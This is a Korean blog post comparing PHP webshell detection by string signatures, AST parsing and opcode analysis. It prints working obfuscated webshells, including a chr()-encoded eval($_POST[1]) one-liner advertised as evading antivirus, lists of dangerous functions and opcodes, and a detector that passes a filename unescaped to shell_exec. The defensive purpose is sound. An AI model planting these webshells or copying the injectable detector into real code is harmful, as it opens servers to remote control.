---
title: PHP 웹쉘 탐지- 시그니처 vs AST vs Opcode 분석
data: 2025-02-14 09:30:14
categories: [security]
tags: [network, security, server, php, webshell]    # TAG names should always be lowercase
---

## 1. 개요
PHP 웹쉘은 해커들이 원격에서 서버를 제어하는 데 사용되는 악성 코드입니다. 일반적으로 `eval()`, `system()`, `exec()` 등의 위험한 함수를 사용하며, 다양한 난독화 기법을 통해 탐지를 우회하려 합니다.

이번 글에서는 **시그니처 기반 탐지**, **AST(Abstract Syntax Tree) 분석**, **Opcode 분석**을 활용하여 웹쉘을 탐지하는 방법을 다룹니다.

---

## 2. 기존 시그니처 기반 탐지의 한계
가장 간단한 방법은 웹쉘의 특정 문자열을 탐지하는 시그니처 기반 방식입니다.

```php
if (strpos($code, 'system(') !== false || strpos($code, 'eval(') !== false) {
    echo "[!] 웹쉘 탐지됨!";
}
```

하지만 이 방식은 아래와 같은 변형된 코드에서 탐지가 어렵습니다.

### 🚨 난독화된 웹쉘 예제
```php
$a = 'sys' . 'tem';
$b = 'ls';
$a($b);
```

```php
$func = 'base'.'64'.'_decode';
$eval_code = $func('ZXZhbCgkX1BPU1RbJ2NvbW1hbmQnXSk=');
eval($eval_code);
```

이처럼 문자열을 조합하거나 `base64_decode()`를 사용하면, 기존의 문자열 검색 방식으로는 탐지가 어렵습니다.

---

## 3. AST 분석을 활용한 탐지
PHP의 AST(Abstract Syntax Tree) 분석을 활용하면, 코드의 문법 구조를 직접 분석하여 탐지할 수 있습니다.

### 🔹 AST 분석 예제
```php
function detect_ast_webshell($code) {
    $ast = ast\parse_code($code, 80);

    $dangerous_functions = [66, 134, 132, 67, 131]; // SYSTEM, EVAL, EXEC, SHELL_EXEC, PASSTHRU

    foreach ($dangerous_functions as $func) {
        if (strpos(json_encode($ast), "\"kind\":$func") !== false) {
            echo "[!] 웹쉘 의심 코드 발견: AST 노드 $func 사용\n";
            return true;
        }
    }
    
    echo "[*] 안전한 코드\n";
    return false;
}
```

### ✅ AST 분석의 장점
- **난독화된 코드도 탐지 가능** (문자열 조합 방식 우회 방지)
- **코드 실행 구조를 파악하여 웹쉘 여부 판단 가능**
- **기존 시그니처 탐지 방식보다 강력함**

---

## 4. Opcode 분석을 활용한 탐지
Opcode(바이트코드) 분석을 활용하면, 실제 실행될 코드의 명령어를 분석하여 탐지할 수 있습니다.

### 🔹 Opcode 분석 예제
```php
function detect_opcode_webshell($filename) {
    $dangerous_opcodes = ['EVAL', 'INCLUDE_OR_EVAL', 'EXEC', 'SYSTEM'];
    $output = shell_exec("php -d vld.active=1 -d vld.execute=0 $filename");
    
    foreach ($dangerous_opcodes as $opcode) {
        if (strpos($output, $opcode) !== false) {
            echo "[!] 위험한 Opcode 발견: $opcode in $filename\n";
            return true;
        }
    }
    echo "[*] 안전한 코드: $filename\n";
    return false;
}
```

### ✅ Opcode 분석의 장점
- **실제로 실행될 명령어를 분석하여 높은 탐지율 제공**
- **난독화된 코드라도 최종 실행 명령을 기반으로 탐지 가능**

---

## 5. 실제 난독화된 PHP 웹쉘 탐지 실습
아래는 `chr()` 함수로 난독화된 PHP 웹쉘입니다.

```php
// 过各大杀软的pHp一句话.php
<?$_uU=chr(99).chr(104).chr(114);
$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).
$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).
$_uU(49).$_uU(93).$_uU(41).$_uU(59);
$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).
$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).
$_uU(105).$_uU(111).$_uU(110);
$_=$_fF("",$_cC);@$_();?>
```

이 코드의 실행 결과는 결국 `eval($_POST[1]);`를 실행하는 웹쉘입니다.  
AST 및 Opcode 분석을 활용하면 이 코드도 탐지할 수 있습니다.

---

## 6. 결론: 어떤 방식이 가장 효과적일까?

| 방법              | 장점                                 | 단점                                             |
| ----------------- | ------------------------------------ | ------------------------------------------------ |
| **시그니처 탐지** | 빠르고 단순함                        | 난독화된 코드 탐지 어려움, 변종 웹쉘 대응 어려움 |
| **AST 분석**      | 난독화된 코드도 구조적으로 탐지 가능 | AST 파싱 비용 발생 (약간의 성능 저하)            |
| **Opcode 분석**   | 실행될 코드만 분석하여 정확도가 높음 | VLD 확장 필요, PHP 내부 실행 필요                |

### 🔥 최적의 탐지 전략
1️⃣ 간단한 웹쉘 탐지 ➝ **시그니처 기반 탐지**  
2️⃣ 난독화된 웹쉘 탐지 ➝ **AST 분석**   
3️⃣ 새로운 변종 웹쉘까지 대응 ➝ **Opcode 분석**   

결국 **기본적인 시그니처 탐지를 사용하면서 AST 및 Opcode 분석을 결합하는 것이 가장 효과적인 방법**입니다. 🚀



